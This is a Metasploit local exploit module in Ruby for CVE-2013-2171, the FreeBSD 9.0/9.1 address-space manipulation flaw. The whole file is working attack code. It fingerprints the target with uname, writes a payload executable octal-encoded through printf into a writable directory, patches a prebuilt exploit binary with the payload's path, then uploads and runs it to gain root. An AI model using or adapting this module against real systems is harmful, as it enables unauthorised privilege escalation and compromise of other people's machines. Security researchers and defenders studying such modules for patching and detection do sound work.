# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit4 < Msf::Exploit::Local
  Rank = GreatRanking
 
  include Msf::Exploit::EXE
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Exploit::FileDropper
 
  def initialize(info={})
    super( update_info( info, {
        &#039;Name&#039;          => &#039;FreeBSD 9 Address Space Manipulation Privilege Escalation&#039;,
        &#039;Description&#039;   => %q{
          This module exploits a vulnerability that can be used to modify portions of
          a process&#039;s address space, which may lead to privilege escalation.  Systems
          such as FreeBSD 9.0 and 9.1 are known to be vulnerable.
        },
        &#039;License&#039;       => MSF_LICENSE,
        &#039;Author&#039;        =>
          [
            &#039;Konstantin Belousov&#039;,   # Discovery
            &#039;Alan Cox&#039;,              # Discovery
            &#039;Hunger&#039;,                # POC
            &#039;sinn3r&#039;                 # Metasploit
          ],
        &#039;Platform&#039;      => [ &#039;bsd&#039; ],
        &#039;Arch&#039;          => [ ARCH_X86 ],
        &#039;SessionTypes&#039;  => [ &#039;shell&#039; ],
        &#039;References&#039;    =>
          [
            [ &#039;CVE&#039;, &#039;2013-2171&#039; ],
            [ &#039;OSVDB&#039;, &#039;94414&#039; ],
            [ &#039;EDB&#039;, &#039;26368&#039; ],
            [ &#039;BID&#039;, &#039;60615&#039; ],
            [ &#039;URL&#039;, &#039;http://www.freebsd.org/security/advisories/FreeBSD-SA-13:06.mmap.asc&#039; ]
          ],
        &#039;Targets&#039;       =>
          [
            [ &#039;FreeBSD x86&#039;, {} ]
          ],
        &#039;DefaultTarget&#039; => 0,
        &#039;DisclosureDate&#039; => "Jun 18 2013",
      }
    ))
    register_options([
      # It isn&#039;t OptPath becuase it&#039;s a *remote* path
      OptString.new("WritableDir", [ true, "A directory where we can write files", "/tmp" ]),
    ], self.class)
 
  end
 
  def check
    res = session.shell_command_token("uname -a")
    return Exploit::CheckCode::Appears if res =~ /FreeBSD 9\.[01]/
 
    Exploit::CheckCode::Safe
  end
 
  def write_file(fname, data)
    oct_data = "\\" + data.unpack("C*").collect {|e| e.to_s(8)} * "\\"
    session.shell_command_token("printf \"#{oct_data}\" > #{fname}")
    session.shell_command_token("chmod +x #{fname}")
 
    chk = session.shell_command_token("file #{fname}")
    return (chk =~ /ERROR: cannot open/) ? false : true
  end
 
 
  def upload_payload
    fname = datastore[&#039;WritableDir&#039;]
    fname = "#{fname}/" unless fname =~ %r&#039;/$&#039;
    if fname.length > 36
      fail_with(Exploit::Failure::BadConfig, "WritableDir can&#039;t be longer than 33 characters")
    end
    fname = "#{fname}#{Rex::Text.rand_text_alpha(4)}"
 
    p = generate_payload_exe
    f = write_file(fname, p)
    return nil if not f
    fname
  end
 
  def generate_exploit(payload_fname)
    #
    # Metasm does not support FreeBSD executable generation.
    #
    path = File.join(Msf::Config.install_root, "data", "exploits", "CVE-2013-2171.bin")
    x = File.open(path, &#039;rb&#039;) { |f| f.read(f.stat.size) }
    x.gsub(/MSFABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890/, payload_fname.ljust(40, "\x00"))
  end
 
  def upload_exploit(payload_fname)
    fname = "/tmp/#{Rex::Text.rand_text_alpha(4)}"
    bin = generate_exploit(payload_fname)
    f = write_file(fname, bin)
    return nil if not f
    fname
  end
 
  def exploit
    payload_fname = upload_payload
    fail_with(Exploit::Failure::NotFound, "Payload failed to upload") if payload_fname.nil?
    print_status("Payload #{payload_fname} uploaded.")
 
    exploit_fname = upload_exploit(payload_fname)
    fail_with(Exploit::Failure::NotFound, "Exploit failed to upload") if exploit_fname.nil?
    print_status("Exploit #{exploit_fname} uploaded.")
 
    register_files_for_cleanup(payload_fname, exploit_fname)
 
    print_status("Executing #{exploit_fname}")
    cmd_exec(exploit_fname)
  end
 
end

